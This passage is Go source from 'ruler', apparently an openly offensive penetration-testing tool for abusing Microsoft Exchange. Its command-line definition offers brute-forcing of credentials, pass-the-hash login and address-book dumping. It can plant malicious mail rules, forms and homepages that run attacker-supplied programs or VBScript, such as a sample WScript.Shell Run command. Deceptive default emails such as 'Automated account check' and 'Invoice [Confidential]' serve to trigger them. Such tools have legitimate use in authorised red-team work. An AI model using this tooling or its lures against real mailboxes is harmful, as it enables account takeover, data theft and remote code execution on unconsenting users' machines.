		utils.Info.Printf("Subject: %s\nBody: %s\n", messageSubject, payload)

	}

	return nil
}

func checkFolder(folderName string) ([]byte, error) {

	var folderID []byte
	propertyTags := make([]mapi.PropertyTag, 2)
	propertyTags[0] = mapi.PidTagDisplayName
	propertyTags[1] = mapi.PidTagSubfolders

	rows, er := mapi.GetSubFolders(mapi.AuthSession.Folderids[mapi.INBOX])

	if er == nil {
		for k := 0; k < len(rows.RowData); k++ {
			//convert string from unicode and then check if it is our target folder
			if utils.FromUnicode(rows.RowData[k][0].ValueArray) == folderName {
				folderID = rows.RowData[k][1].ValueArray
				break
			}
		}
	}

	if len(folderID) == 0 {
		utils.Info.Println("No 'ruler' search folder exists. Creating one to use")
		_, err := mapi.CreateSearchFolder(folderName)
		if err != nil {
			return nil, err
		}

		time.Sleep(time.Second * (time.Duration)(5))

		rows, er = mapi.GetSubFolders(mapi.AuthSession.Folderids[mapi.INBOX])
		if er != nil || rows != nil {
			for k := 0; k < len(rows.RowData); k++ {
				//convert string from unicode and then check if it is our target folder
				if utils.FromUnicode(rows.RowData[k][0].ValueArray) == folderName {
					folderID = rows.RowData[k][1].ValueArray
					break
				}
			}
		} else {
			return nil, er
		}
	}

	return folderID, nil
}

func checkLastSent() error {
	//This gets the "Sent Items" folder and grabs the last sent message.
	//Using the ClientInfo tag, we check who if this message was sent from Outlook or OWA

	//get the PropTag for ClientInfo
	folderid := mapi.AuthSession.Folderids[mapi.SENT]
	rows, err := mapi.GetContents(folderid)

	if err != nil {
		return err
	}

	if rows == nil {
		return fmt.Errorf("Sent folder is empty")
	}
	//get most recent message
	messageid := rows.RowData[0][1].ValueArray

	//for some reason getting named property tags isn't working for me. Maybe I'm an idiot
	//so lets simply grab all tags. And then filter until we find one that starts with Client=
	buff, err := mapi.GetPropertyIdsList(folderid, messageid)

	var props []byte
	idcount := 0
	for _, prop := range buff.PropertyTags {
		props = append(props, utils.EncodeNum(prop.PropertyID)...)
		idcount++
	}

	propNames, e := mapi.GetPropertyNamesFromID(folderid, messageid, props, idcount)

	if e != nil {
		return e
	}

	var getProps []mapi.PropertyTag
	var clientPropID uint16
	var clientIPPropID uint16
	var serverIPPropID uint16

	for i, p := range propNames.PropertyNames {
		if p.Kind == 0x01 {
			pName := utils.FromUnicode(p.Name)
			if pName == "ClientInfo" {
				getProps = append(getProps, buff.PropertyTags[i])
				clientPropID = buff.PropertyTags[i].PropertyID
			} else if pName == "x-ms-exchange-organization-originalclientipaddress" {
				getProps = append(getProps, buff.PropertyTags[i])
				clientIPPropID = buff.PropertyTags[i].PropertyID
			} else if pName == "x-ms-exchange-organization-originalserveripaddress" {
				getProps = append(getProps, buff.PropertyTags[i])
				serverIPPropID = buff.PropertyTags[i].PropertyID
			}
		} else {
			if buff.PropertyTags[i].PropertyID == 0x0039 {
				getProps = append(getProps, buff.PropertyTags[i])
			}
		}

	}
	messageProps, err := mapi.GetMessage(folderid, messageid, getProps)
	if err != nil {
		return err
	}

	for _, row := range messageProps.GetData() {

		id := utils.DecodeUint16(row.PropID)
		switch id {
		case 0x0039:
			t := (utils.DecodeUint64(row.ValueArray) - 116444736000000000) * 100
			x := time.Unix(0, int64(t))
			utils.Info.Printf("Last Message sent at: %s \n", x.UTC())
		case clientPropID:
			clstring := utils.FromUnicode(row.ValueArray)
			if clstring[6:9] == "OWA" {
				utils.Warning.Printf("Last message sent from OWA! User-Agent: %s\n", clstring[10:])
			} else {
				utils.Info.Printf("Last message sent from: %s\n", clstring[6:])
			}
		case clientIPPropID:
			utils.Info.Printf("Client IP Address: %s\n", utils.FromUnicode(row.ValueArray))
		case serverIPPropID:
			utils.Info.Printf("Exchange Server IP: %s\n", utils.FromUnicode(row.ValueArray))
		}
	}
	return nil
}

func main() {

	app := cli.NewApp()

	app.Name = "ruler"
	app.Usage = "A tool to abuse Exchange Services"
	app.Version = "2.2.1"
	app.Author = "Etienne Stalmans <etienne@sensepost.com>, @_staaldraad"
	app.Description = `         _
 _ __ _   _| | ___ _ __
| '__| | | | |/ _ \ '__|
| |  | |_| | |  __/ |
|_|   \__,_|_|\___|_|

A tool by @_staaldraad from @sensepost to abuse Exchange Services.`

	app.Flags = []cli.Flag{
		cli.StringFlag{
			Name:  "domain,d",
			Value: "",
			Usage: "A domain for the user (optional in most cases. Otherwise allows: domain\\username)",
		},
		cli.BoolFlag{
			Name:  "o365",
			Usage: "We know the target is on Office365, so authenticate directly against that.",
		},
		cli.StringFlag{
			Name:  "username,u",
			Value: "",
			Usage: "A valid username",
		},
		cli.StringFlag{
			Name:  "password,p",
			Value: "",
			Usage: "A valid password",
		},
		cli.StringFlag{
			Name:  "hash",
			Value: "",
			Usage: "A NT hash for pass the hash",
		},
		cli.StringFlag{
			Name:  "email,e",
			Value: "",
			Usage: "The target's email address",
		},
		cli.StringFlag{
			Name:  "cookie",
			Value: "",
			Usage: "Any third party cookies such as SSO that are needed",
		},
		cli.StringFlag{
			Name:  "config",
			Value: "",
			Usage: "The path to a config file to use",
		},
		cli.StringFlag{
			Name:  "url",
			Value: "",
			Usage: "If you know the Autodiscover URL or the autodiscover service is failing. Requires full URI, https://autodisc.d.com/autodiscover/autodiscover.xml",
		},
		cli.StringFlag{
			Name:  "proxy",
			Value: "",
			Usage: "If you need to use an upstream proxy. Works with https://user:pass@ip:port or https://ip:port",
		},
		cli.BoolFlag{
			Name:  "insecure,k",
			Usage: "Ignore server SSL certificate errors",
		},
		cli.BoolFlag{
			Name:  "noencrypt",
			Usage: "Don't use encryption the RPC level - some environments require this",
		},
		cli.BoolFlag{
			Name:  "basic,b",
			Usage: "Force Basic authentication",
		},
		cli.BoolFlag{
			Name:  "admin",
			Usage: "Login as an admin",
		},
		cli.BoolFlag{
			Name:  "nocache",
			Usage: "Don't use the cached autodiscover record",
		},
		cli.BoolFlag{
			Name:  "rpc",
			Usage: "Force RPC/HTTP rather than MAPI/HTTP",
		},
		cli.BoolFlag{
			Name:  "verbose",
			Usage: "Be verbose and show some of thei inner workings",
		},
		cli.BoolFlag{
			Name:  "debug",
			Usage: "Be print debug info",
		},
	}

	app.Before = func(c *cli.Context) error {
		if c.Bool("verbose") == true && c.Bool("debug") == false {
			utils.Init(os.Stdout, os.Stdout, ioutil.Discard, os.Stderr)
		} else if c.Bool("verbose") == false && c.Bool("debug") == true {
			utils.Init(ioutil.Discard, os.Stdout, os.Stdout, os.Stderr)
		} else if c.Bool("debug") == true {
			utils.Init(os.Stdout, os.Stdout, os.Stdout, os.Stderr)
		} else {
			utils.Init(ioutil.Discard, os.Stdout, ioutil.Discard, os.Stderr)
		}
		return nil
	}

	app.Commands = []cli.Command{
		{
			Name:    "add",
			Aliases: []string{"a"},
			Usage:   "add a new rule",
			Flags: []cli.Flag{
				cli.StringFlag{
					Name:  "name,n",
					Value: "Delete Spam",
					Usage: "A name for our rule",
				},
				cli.StringFlag{
					Name:  "trigger,t",
					Value: "Hey John",
					Usage: "A trigger word or phrase - this is going to be the subject of our trigger email",
				},
				cli.StringFlag{
					Name:  "location,l",
					Value: "C:\\Windows\\System32\\calc.exe",
					Usage: "The location of our application to launch. Typically a WEBDAV URI",
				},
				cli.BoolFlag{
					Name:  "send,s",
					Usage: "Trigger the rule by sending an email to the target",
				},
				cli.StringFlag{
					Name:  "body,b",
					Value: "**Automated account check - please ignore**\r\n\r\nMicrosoft Exchange has run an automated test on your account.\r\nEverything seems to be configured correctly.",
					Usage: "The email body you may wish to use",
				},
				cli.StringFlag{
					Name:  "subject",
					Value: "",
					Usage: "The subject you wish to use, this should contain your trigger word.",
				},
			},
			Action: func(c *cli.Context) error {
				//check that name, trigger and location were supplied
				if c.String("name") == "" || c.String("trigger") == "" || c.String("location") == "" {
					cli.NewExitError("Missing rule item. Use --name, --trigger and --location", 1)
					cli.OsExiter(1)
				}

				err := connect(c)
				if err != nil {
					utils.Error.Println(err)
					cli.OsExiter(1)
				}
				err = addRule(c)
				exit(err)

				return nil
			},
		},
		{
			Name:    "delete",
			Aliases: []string{"r"},
			Usage:   "delete an existing rule",
			Flags: []cli.Flag{
				cli.StringFlag{
					Name:  "id",
					Value: "",
					Usage: "The ID of the rule to delete",
				},
				cli.StringFlag{
					Name:  "name",
					Value: "",
					Usage: "The name of the rule to delete",
				},
			},
			Action: func(c *cli.Context) error {
				//check that ID was supplied
				if c.String("id") == "" && c.String("name") == "" {
					return cli.NewExitError("Rule id or name required. Use --id or --name", 1)
				}
				err := connect(c)
				if err != nil {
					utils.Error.Println(err)
					cli.OsExiter(1)
				}
				err = deleteRule(c)

				exit(err)

				return nil
			},
		},
		{
			Name:    "display",
			Aliases: []string{"d"},
			Usage:   "display all existing rules",
			Action: func(c *cli.Context) error {
				err := connect(c)
				if err != nil {
					utils.Error.Println(err)
					cli.OsExiter(1)
				}
				err = displayRules(c)
				exit(err)

				return nil
			},
		},
		{
			Name:    "check",
			Aliases: []string{"c"},
			Usage:   "Check if the credentials work and we can interact with the mailbox",
			Flags: []cli.Flag{
				cli.BoolFlag{
					Name:  "last",
					Usage: "Returns information about the last client used to send an email",
				},
			},
			Action: func(c *cli.Context) error {
				err := connect(c)
				if err != nil {
					utils.Error.Println(err)
					cli.OsExiter(1)
				}

				utils.Info.Println("Looks like we are good to go!")

				if c.Bool("last") == true {
					err = checkLastSent()
				}
				exit(err)
				return nil
			},
		},
		{
			Name:    "send",
			Aliases: []string{"s"},
			Usage:   "Send an email to trigger an existing rule. This uses the target user's own account.",
			Flags: []cli.Flag{
				cli.StringFlag{
					Name:  "subject,s",
					Value: "",
					Usage: "A subject to use, this should contain our trigger word",
				},
				cli.StringFlag{
					Name:  "body,b",
					Value: "**Automated account check - please ignore**\r\nMicrosoft Exchange has run an automated test on your account.\r\nEverything seems to be configured correctly.",
					Usage: "The email body you may wish to use",
				},
			},
			Action: func(c *cli.Context) error {
				//check that trigger word was supplied
				if c.String("subject") == "" {
					return cli.NewExitError("The subject is required. Use --subject", 1)
				}
				err := connect(c)
				if err != nil {
					utils.Error.Println(err)
					cli.OsExiter(1)
				}
				err = sendMessage(c.String("subject"), c.String("body"))
				exit(err)
				return nil
			},
		},
		{
			Name:    "autodiscover",
			Aliases: []string{"u"},
			Usage:   "Just run the autodiscover service to find the authentication point",
			Flags: []cli.Flag{
				cli.BoolFlag{
					Name:  "dump,d",
					Usage: "Dump the autodiscover record to a text file (this needs credentails)",
				},
				cli.BoolFlag{
					Name:  "mapi,m",
					Usage: "Dump the MAPI version of the autodiscover record",
				},
				cli.StringFlag{
					Name:  "out,o",
					Value: "",
					Usage: "The file to write to",
				},
			},
			Action: func(c *cli.Context) error {
				err := discover(c)
				if err != nil {
					utils.Error.Println(err)
					cli.OsExiter(1)
				}
				return nil
			},
		},
		{
			Name:    "brute",
			Aliases: []string{"b"},
			Usage:   "Do a bruteforce attack against the autodiscover service to find valid username/passwords",
			Flags: []cli.Flag{
				cli.StringFlag{
					Name:  "users,u",
					Value: "",
					Usage: "Filename for a username list (one name per line)",
				},
				cli.StringFlag{
					Name:  "passwords,p",
					Value: "",
					Usage: "Filename for a password list (one password per line)",
				},
				cli.StringFlag{
					Name:  "userpass",
					Value: "",
					Usage: "Filename for a username:password list (one per line)",
				},
				cli.IntFlag{
					Name:  "attempts,a",
					Value: 3,
					Usage: "Number of attempts before delay",
				},
				cli.IntFlag{
					Name:  "threads,t",
					Value: 3,
					Usage: "Number of concurrent attempts. Reduce if mutex issues appear.",
				},
				cli.IntFlag{
					Name:  "delay,d",
					Value: 5,
					Usage: "Number of minutes to delay between attempts",
				},
				cli.BoolFlag{
					Name:  "stop,s",
					Usage: "Stop on success",
				},
				cli.BoolFlag{
					Name:  "verbose,v",
					Usage: "Display each attempt",
				},
			},
			Action: func(c *cli.Context) error {
				err := brute(c)
				if err != nil {
					utils.Error.Println(err)
					cli.OsExiter(1)
				}
				return nil
			},
		},
		{
			Name:  "abk",
			Usage: "Interact with the Global Address Book",
			Subcommands: []cli.Command{
				{
					Name:  "list",
					Usage: "list the entries of the GAL",
					Action: func(c *cli.Context) error {
						err := connect(c)
						if err != nil {
							utils.Error.Println(err)
							cli.OsExiter(1)
						}
						err = abkList(c)
						exit(err)
						return nil
					},
				},
				{
					Name:  "dump",
					Usage: "dump the entries of the GAL and save to local file",
					Flags: []cli.Flag{
						cli.StringFlag{
							Name:  "output,o",
							Value: "",
							Usage: "File to save the GAL to",
						},
					},
					Action: func(c *cli.Context) error {
						if c.String("output") == "" {
							return cli.NewExitError("The file to save to is required. Use --output or -o", 1)
						}
						err := connect(c)
						if err != nil {
							utils.Error.Println(err)
							cli.OsExiter(1)
						}
						err = abkDump(c)
						exit(err)
						return nil
					},
				},
			},
		},
		{
			Name:  "form",
			Usage: "Interact with the forms function.",
			Subcommands: []cli.Command{
				{
					Name:  "add",
					Usage: "creates a new form. ",
					Flags: []cli.Flag{
						cli.StringFlag{
							Name:  "suffix",
							Value: "pew",
							Usage: "A 3 character suffix for the form. Defaults to pew",
						},
						cli.StringFlag{
							Name:  "command,c",
							Value: "",
							Usage: "The command to execute.",
						},
						cli.StringFlag{
							Name:  "input,i",
							Value: "",
							Usage: "A path to a file containing the command to execute. This takes precidence over 'command'",
						},
						cli.BoolFlag{
							Name:  "send,s",
							Usage: "Trigger the form once it's been created.",
						},
						cli.BoolFlag{
							Name:  "raw",
							Usage: "Use a blank template allowing Raw VBScript.",
						},
						cli.BoolFlag{
							Name:  "rule,r",
							Usage: "Trigger the form with a rule. This will add a new rule!",
						},
						cli.StringFlag{
							Name:  "body,b",
							Value: "This message cannot be displayed in the previewer.\n\n\n\n\n",
							Usage: "The email body you may wish to use",
						},
						cli.StringFlag{
							Name:  "subject",
							Value: "Invoice [Confidential]",
							Usage: "The subject you wish to use, this should contain your trigger word.",
						},
					},
					Action: func(c *cli.Context) error {
						if c.String("suffix") == "" {
							return cli.NewExitError("The suffix is needs to be set.", 1)
						}
						if c.String("command") == "" && c.String("input") == "" {
							utils.Error.Println("Please supply a valid command.\nSample:\nCreateObject(\"WScript.Shell\").Run \"calc.exe\", 0, False")
							return cli.NewExitError("No command supplied", 1)
						}

						err := connect(c)
						if err != nil {
							utils.Error.Println(err)
							cli.OsExiter(1)
						}
						err = createForm(c)
						exit(err)
						return nil
					},
				},
				{
					Name:  "send",
					Usage: "send an email to an existing form and trigger it",
					Flags: []cli.Flag{
						cli.StringFlag{
							Name:  "suffix,s",
							Value: "",
							Usage: "The suffix used when creating the form. This must be the same as the value used when the form was created.",
						},
						cli.StringFlag{
							Name:  "body,b",
							Value: "This message cannot be displayed in the previewer.\n\n\n\n\n",
							Usage: "The email body you may wish to use",
						},
						cli.StringFlag{
							Name:  "subject",
							Value: "Invoice [Confidential]",
							Usage: "The subject you wish to use, this should contain your trigger word.",
						},
						cli.StringFlag{
							Name:  "target",
							Value: "",
							Usage: "Send the email to another account.",
						},
					},
					Action: func(c *cli.Context) error {
						if c.String("suffix") == "" {
							return cli.NewExitError("The suffix is required. Please use the same value as supplied to the 'add' command. Default is pew", 1)
						}

						err := connect(c)
						if err != nil {
							utils.Error.Println(err)
							cli.OsExiter(1)
						}
						err = triggerForm(c)
						exit(err)
						return nil
					},
				},
				{
					Name:  "delete",
					Usage: "delete an existing form",
					Flags: []cli.Flag{
						cli.StringFlag{
							Name:  "suffix,s",
							Value: "",
							Usage: "The suffix used when creating the form. This must be the same as the value used when the form was created.",
						},
					},
					Action: func(c *cli.Context) error {
						if c.String("suffix") == "" {
							return cli.NewExitError("The suffix is required. Please use the same value as supplied to the 'add' command. Default is pew", 1)
						}

						err := connect(c)
						if err != nil {
							utils.Error.Println(err)
							cli.OsExiter(1)
						}
						err = deleteForm(c)
						exit(err)
						return nil
					},
				},
				{
					Name:  "display",
					Usage: "display all existing forms",

					Action: func(c *cli.Context) error {

						err := connect(c)
						if err != nil {
							utils.Error.Println(err)
							cli.OsExiter(1)
						}
						err = displayForms(c)
						exit(err)
						return nil
					},
				},
			},
		},
		{
			Name:  "homepage",
			Usage: "Interact with the homepage function.",
			Subcommands: []cli.Command{
				{
					Name:  "add",
					Usage: "creates a new homepage. ",
					Flags: []cli.Flag{
						cli.StringFlag{
							Name:  "url,u",
							Value: "",
							Usage: "The location where the page is stored",
						},
					},
					Action: func(c *cli.Context) error {
						if c.String("url") == "" {
							return cli.NewExitError("You need to supply a valid URL. Use --url 'http://location/x.html'", 1)
						}
						//parse URL to ensure valid
						if _, e := url.Parse(c.String("url")); e != nil {
							return cli.NewExitError("You need to supply a valid URL. Use --url 'http://location/x.html'", 1)
						}

						err := connect(c)
						if err != nil {
							utils.Error.Println(err)
							cli.OsExiter(1)
						}
						createHomePage(c)
						exit(err)
						return nil
					},
				},
				{
					Name:  "delete",
					Usage: "delete an existing homepage and resets to using folder view",
					Flags: []cli.Flag{},
					Action: func(c *cli.Context) error {

						err := connect(c)
						if err != nil {
							utils.Error.Println(err)
							cli.OsExiter(1)
						}
						err = deleteHomePage()
						exit(err)
						return nil
					},
				},
				{
					Name:  "display",
					Usage: "display current homepage setting",

					Action: func(c *cli.Context) error {

						err := connect(c)
						if err != nil {
							utils.Error.Println(err)
							cli.OsExiter(1)
						}
						err = displayHomePage()
						exit(err)
						return nil
					},
				},
			},
		},
		{
			Name:  "search",
			Usage: "Search for items",
			Flags: []cli.Flag{
				cli.BoolFlag{
					Name:  "subject",
					Usage: "Search only in the subject",
				},
				cli.StringFlag{
					Name:  "term",
					Value: "",
					Usage: "The term to search for",
				},
			},
			Action: func(c *cli.Context) error {
				if c.String("term") == "" {
					return cli.NewExitError("You need to supply a valid search term. Use --term ", 1)
				}
				err := connect(c)
				if err != nil {
					utils.Error.Println(err)
					cli.OsExiter(1)
				}
				err = searchFolders(c)
				exit(err)
				return nil
			},
		},
	}

	app.Action = func(c *cli.Context) error {
		cli.ShowAppHelp(c)
		return nil
	}

	app.Run(os.Args)

}
